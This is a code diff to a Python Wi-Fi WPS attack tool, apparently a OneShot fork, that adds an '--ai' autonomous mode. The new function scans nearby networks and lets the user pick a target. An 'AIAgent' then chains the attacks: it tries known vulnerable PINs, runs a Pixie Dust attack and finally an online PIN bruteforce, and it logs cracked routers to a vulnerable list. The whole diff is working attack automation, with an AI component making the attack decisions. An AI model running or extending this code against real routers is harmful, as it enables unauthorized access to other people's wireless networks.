@@ -911,6 +911,11 @@ Copyright (C) 2026 chkndrp
         help='Show all networks in the scan table, including those with WPS disabled/absent (marked gray as OFF)'
     )
     opt_group.add_argument(
+        '--ai',
+        action='store_true',
+        help='Full AI autonomous mode: scan -> list -> select -> AI decides attack chain'
+    )
+    opt_group.add_argument(
         '-d', '--delay',
         type=float,
         default=0,
@@ -973,7 +978,7 @@ Copyright (C) 2026 chkndrp
 
     args = parser.parse_args()
 
-    if not args.check and not args.interface:
+    if not args.check and not args.interface and not getattr(args, 'ai', False):
         parser.error('argument -i/--interface is required')
 
     if (args.pixie_force or args.show_pixie) and not args.pixie_dust:
@@ -3806,6 +3811,200 @@ def checkBssid(bssid: str, interface: str = None):
     else:
         logger.warning('NOT in the vulnerable list: no known vulnerable device algorithm matches this router OUI')
 
+def _detectInterface():
+    """Auto-detect wireless interface."""
+    import subprocess
+    try:
+        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
+        for line in result.stdout.split('\n'):
+            line = line.strip()
+            if line.startswith('Interface'):
+                iface = line.split()[-1]
+                if iface != 'lo':
+                    return iface
+    except Exception:
+        pass
+    # Fallback: try common names
+    for name in ['wlan0', 'wlan1', 'wlp2s0', 'wlx00c0ca']:
+        try:
+            result = subprocess.run(['ip', 'link', 'show', name], capture_output=True, text=True, timeout=3)
+            if result.returncode == 0 and 'UP' in result.stdout:
+                return name
+        except Exception:
+            continue
+    return 'wlan0'  # Last resort
+
+def _aiAutonomousMode():
+    """Fully autonomous AI mode: detect interface -> scan -> user select -> AI attack.
+
+    Flow:
+      1. Auto-detect wireless interface (or ask user)
+      2. Scan all nearby networks
+      3. Show numbered list to user
+      4. User selects a network
+      5. AI checks vuln list
+      6. If vuln found -> use PIN directly
+      7. If not -> Pixie Dust -> bruteforce chain
+      8. AI makes all decisions via AIAgent
+    """
+    global args
+
+    print()
+    print('=' * 56)
+    print('  ONESHOT AI — Autonomous Mode')
+    print('  Scanning... Attacking... Learning...')
+    print('=' * 56)
+    print()
+
+    # Step 1: Detect interface
+    interface = getattr(args, 'interface', None) or _detectInterface()
+    print(f'[*] Using interface: {interface}')
+    print()
+
+    # Bring interface up
+    try:
+        src.utils.ifaceCtl(interface, action='up')
+    except Exception:
+        pass
+
+    # Step 2: Scan networks
+    print('[*] Scanning for WPS networks...')
+    try:
+        with open(args.vuln_list, 'r', encoding='utf-8') as f:
+            vuln_list = f.read().splitlines()
+    except FileNotFoundError:
+        vuln_list = []
+
+    result = scanForNetworks(interface, vuln_list)
+    if result is None:
+        print('[!] No networks found. Make sure your interface is up and supports monitor mode.')
+        return
+
+    bssid, network_info = result
+    essid = network_info.get('ESSID', 'Unknown')
+    signal = network_info.get('Level', '?')
+    wps_ver = network_info.get('WPS version', '?')
+    wps_locked = network_info.get('WPS locked', False)
+    model = network_info.get('Model', '')
+    model_num = network_info.get('Model number', '')
+
+    print()
+    print(f'[*] Selected: {essid} ({bssid})')
+    print(f'    Signal: {signal} dBm | WPS v{wps_ver} | Locked: {wps_locked}')
+    if model:
+        print(f'    Model: {model} {model_num}')
+    print()
+
+    # Step 3: AI decides attack chain
+    agent = AIAgent()
+    generator = src.wps.generator.WPSpin()
+
+    ctx = {
+        'bssid':         bssid,
+        'signal':        signal if isinstance(signal, (int, float)) else -50,
+        'wps_version':   str(wps_ver),
+        'wps_locked':    wps_locked,
+        'is_vulnerable': False,
+        'attempt':       1,
+        'timeouts':      0,
+        'resp_delay':    0.0,
+        'm_msgs':        0,
+        'fails':         0,
+        'hist_locks':    0,
+    }
+
+    success = False
+
+    # --- Phase 1: Check vulnerable list ---
+    print('[AI] Phase 1: Checking vulnerable list...')
+    algos = generator._getSuggested(bssid)
+    ctx['is_vulnerable'] = len(algos) > 0
+
+    if algos:
+        action = agent.decide('vuln_list', ctx)
+        print(f'[AI] Decision: {action}')
+
+        if action != 'skip' and action != 'abort':
+            connection = src.wps.connection.Initialize(interface)
+            for algo in algos:
+                pin = algo.get('pin', '')
+                if pin:
+                    print(f'[AI] Trying PIN: {pin} ({algo["name"]})')
+                    ok = connection.singleConnection(bssid, pin)
+                    cs = connection.CONNECTION_STATUS
+                    ctx['m_msgs'] = cs.LAST_M_MESSAGE
+                    ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+                    ctx['fails'] = 0 if ok else 1
+                    agent.record(ctx, 'proceed', ok)
+                    if ok:
+                        success = True
+                        print(f'[AI] SUCCESS! PIN: {pin}')
+                        break
+            if not success:
+                print('[AI] Vuln list PINs failed')
+                try:
+                    connection._cleanup()
+                except Exception:
+                    pass
+    else:
+        print('[AI] Not in vulnerable list')
+
+    # --- Phase 2: Pixie Dust ---
+    if not success:
+        print()
+        print('[AI] Phase 2: Pixie Dust attack...')
+        ctx['attempt'] = 2
+        action = agent.decide('pixie_dust', ctx)
+        print(f'[AI] Decision: {action}')
+
+        if action != 'skip' and action != 'abort':
+            likely_pin = generator.getLikely(bssid) or '12345670'
+            saved_pixie = args.pixie_dust
+            args.pixie_dust = True
+            connection = src.wps.connection.Initialize(interface)
+            ok = connection.singleConnection(bssid, likely_pin)
+            cs = connection.CONNECTION_STATUS
+            ctx['m_msgs'] = cs.LAST_M_MESSAGE
+            ctx['timeouts'] = getattr(cs, 'TIMEOUT_COUNT', 0)
+            ctx['fails'] = 0 if ok else 1
+            agent.record(ctx, 'proceed', ok)
+            args.pixie_dust = saved_pixie
+            if ok:
+                success = True
+                print(f'[AI] SUCCESS! Pixie Dust recovered PIN')
+            else:
+                print('[AI] Pixie Dust failed')
+                try:
+                    connection._cleanup()
+                except Exception:
+                    pass
+
+    # --- Phase 3: Online bruteforce ---
+    if not success:
+        print()
+        print('[AI] Phase 3: Online bruteforce...')
+        ctx['attempt'] = 3
+        action = agent.decide('bruteforce', ctx)
+        print(f'[AI] Decision: {action}')
+
+        if action != 'abort':
+            print('[AI] Starting bruteforce (this may take a while)...')
+            bf = src.wps.bruteforce.Initialize(interface)
+            bf.smartBruteforce(bssid, '0000')
+
+    # --- Finalize ---
+    if success:
+        print()
+        print('[AI] Attack successful!')
+        src.utils.addVulnerableAP(network_info, args.vuln_list)
+    else:
+        print()
+        print('[AI] All attack phases exhausted. No success.')
+
+    agent.finalize()
+    print(f'[AI] Model saved: {agent.status()}')
+    print()
+
 def main():
     """Main os-e code"""
     global args
@@ -3819,6 +4018,11 @@ def main():
     checkRequirements()
     setupDirectories()
     _ensure_ml_deps()
+
+    # --- AI autonomous mode ---
+    if getattr(args, 'ai', False):
+        _aiAutonomousMode()
+        return
 
     logger.initializeLogging()
 
